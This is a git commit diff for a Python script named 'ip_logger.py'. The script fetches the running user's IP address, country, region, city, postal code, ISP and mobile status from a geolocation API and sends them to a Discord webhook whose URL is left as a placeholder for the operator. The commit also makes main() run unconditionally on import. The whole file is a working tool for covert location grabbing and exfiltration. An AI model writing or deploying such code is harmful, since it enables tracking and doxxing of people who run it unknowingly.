f0c1489e6c5c8dca83b1100c42c742d923359d8c
Lack <118399851+Lack54@users.noreply.github.com>
2023-01-15 12:36:56 -0500

    Update ip_logger.py

--- Ip Logger/ip_logger.py
+++ Ip Logger/ip_logger.py
@@ -1,22 +1,49 @@
 import requests
-import os
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
+
 def main():
-    os.system("pip install discord-webhook")
-    from discord_webhook import DiscordWebhook, DiscordEmbed
-    ip = requests.get('http://ipinfo.io/json').json()['ip']
-    log("ip has been logged!", f"logged ip: {ip}")
+    response = requests.get("https://api.techniknews.net/ipgeo").json()
+    ip, country, regionName, city, zip, isp, mobile = response["ip"], response["country"], response["regionName"], response["city"], response["zip"], response["isp"], response["mobile"]
+    dis = (f"Country: {country}\nProvince/State: {regionName}\nCity: {city}\nPostalCode: {zip}\nIsp: {isp}\nUser Mobile: {mobile}")
+    log("Geolocated Ip Address!", dis)
+
 
 def log(title, discription):
-    webhook = DiscordWebhook(url="YOUR WEBHOOK HERE")
+    webhook = DiscordWebhook(url=" YOUR WEBHOOK URL GOES HERE!!!!!!! ")
     embed = DiscordEmbed(title=title, description=discription, color="0000FF")
-
-
-
 
     webhook.add_embed(embed)
     response = webhook.execute()
 
-if __name__ == "__main__":
-    main()
+
+main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
